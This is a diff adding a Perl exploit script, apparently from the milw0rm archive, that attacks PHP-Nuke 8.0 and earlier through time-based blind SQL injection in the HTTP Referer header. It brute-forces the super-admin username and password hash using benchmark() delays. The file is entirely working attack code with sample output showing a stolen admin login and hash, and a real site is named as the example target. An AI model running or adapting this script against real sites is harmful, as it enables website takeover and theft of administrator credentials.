@@ -1,0 +1,160 @@
+#!/usr/bin/perl 
+#0day exploit for PHP-nuke <=8.0 Final
+#Blind sql injection attack in INSERT syntax
+#version for mysql >= 4.0.24, using 'brute force'
+#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
+#Screenshot:
+#0day exploit for PHP-nuke <=8.0 Final
+#Sql injection attack in INSERT syntax
+#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
+#
+#[+]Time normal query: 2 seconds
+#[+]Length user's record: 5
+#[+]Length password's record: 32
+#[+]Login:
+#admin
+#[+]Password:
+#b481ab90de84a345c665f1e4ef3c2
+#[+]Super admin:
+#admin:b481ab90de84a345c66585e1f4cf16e4
+use strict;
+use warnings;
+use LWP;
+my $offset=4;#It is the most important variable!!
+my $adres=shift or help();
+my $ua = LWP::UserAgent->new;
+my $zadanie = HTTP::Request->new(GET => $adres);
+my ($respone,$komenda,$poczatek,$koniec,$czas_nor,$i,$j,$dlugosc_user,$user,$hash,$referer,$czy_dziala,$znak);
+banner();
+$czas_nor=polacz("http://www.krasza.int.pl");
+print "[+]Time normal query: $czas_nor seconds\n";
+$dlugosc_user=ustal_dlugosc("aid",8);
+print "[+]Length user's record: $dlugosc_user\n";
+print "[+]Length password's record: 32\n";
+print "[+]Login:\n";
+$user=brute_force_aid($dlugosc_user);
+print "[+]Password:\n";
+$hash=brute_force_pass(32);
+print "[+]Super admin:\n";
+print "$user:$hash\n";
+##
+sub brute_force_pass{
+	my ($dlugosc)=@_;
+	my ($i,$j,$referer,$wynik,$dolny_zakres);
+	for($i=1;$i<=$dlugosc;$i++){
+		for($j=48;$j<=122;$j++){
+		$referer="http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`pwd`,".$i.",1))=".$j.") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*";
+        	$czy_dziala=czy_dziala($referer);
+        		if($czy_dziala==1){
+					$znak=chr($j);
+					print "$znak";
+					$wynik.=$znak;
+				if($i<$dlugosc){
+					$i+=1;
+					$j=47;
+				}else{
+					last;
+				}
+			}
+			#przeskok-optymalizacja;]
+			if($j==57){
+				$j=96;
+			}
+		}
+	}
+		print "\n";
+		return $wynik;
+}
+sub brute_force_aid{
+        my ($dlugosc)=@_;
+        my ($i,$j,$referer,$wynik,$dolny_zakres);
+        for($i=1;$i<=$dlugosc;$i++){
+                for($j=48;$j<=122;$j++){
+                $referer="http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`aid`,".$i.",1))=".$j.") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*";
+                $czy_dziala=czy_dziala($referer);
+                        if($czy_dziala==1){
+					$znak=chr($j);
+                                	print "$znak";
+					$wynik.=$znak;
+				if($i<$dlugosc){
+                                	$i+=1;
+					$j=47;
+				}else{
+					last;
+				}
+                        }
+			if($j==57){
+				$j=64;
+			}
+			if($j==90){
+				$j=96;
+			}
+                }
+        }
+                print "\n";
+                return $wynik;
+}
+sub ustal_dlugosc{
+	my ($pole,$len)=@_;
+	my ($referer,$narazie_dziala_liczba,$nie_dziala_liczba);
+	$narazie_dziala_liczba=0;
+	$nie_dziala_liczba=65;
+	#for($len=1;$len<64;$len++){
+	while($len<=64){
+		if($narazie_dziala_liczba==$len || $nie_dziala_liczba<=$len){
+			return $narazie_dziala_liczba;
+		}
+		$referer="http://www.krasza.int.pl'),(-1,(SELECT IF((LENGTH(`".$pole."`)>".$len.") & 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*";
+		$czy_dziala=czy_dziala($referer);
+		if($czy_dziala==1){
+			$narazie_dziala_liczba=$len+1;
+			$len+=2;
+		}else{
+			$nie_dziala_liczba=$len+1;
+			$len-=1;
+		}
+	}
+	print "[-]Exploit Failed\n";
+	exit;
+}
+sub czy_dziala{
+	my ($refik)=@_;
+	my $czas_zapytania;
+	$czas_zapytania=polacz($refik);
+	if($czas_zapytania>$czas_nor+$offset){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+sub polacz{
+	my ($referrer)=@_;
+	my ($czas,$czas_poczatek,$czas_koniec);
+	$zadanie->referer($referrer);
+	$czas_poczatek=time();
+        $respone=$ua->request($zadanie);
+        $respone->is_success or die "$adres : ",$respone->message,"\n";
+        $czas_koniec=time();
+	$czas=$czas_koniec-$czas_poczatek;
+	return $czas;
+}
+sub banner{
+	print "0day exploit for PHP-nuke <=8.0 Final\n";
+        print "Blind sql injection attack in INSERT syntax\n";
+	print "version mysql >= 4.0.24, using 'brute force'\n";
+        print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n\n";
+}
+sub help{
+	print "0day exploit for PHP-nuke <=8.0 Final\n";
+	print "Blind sql injection attack in INSERT syntax\n";
+	print "version mysql >= 4.0.24, using 'brute force'\n";
+	print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n";
+	print "Use:\n";
+	print "\tperl exploit.pl [url]\n";
+	print "\t[url]-vicitim webpage with index.php\n";
+	print "Example:\n";
+	print "\tperl bruteforce.pl http://phpnuke.org/index.php\n";
+	exit(0);
+}
+
+# milw0rm.com [2007-02-20]
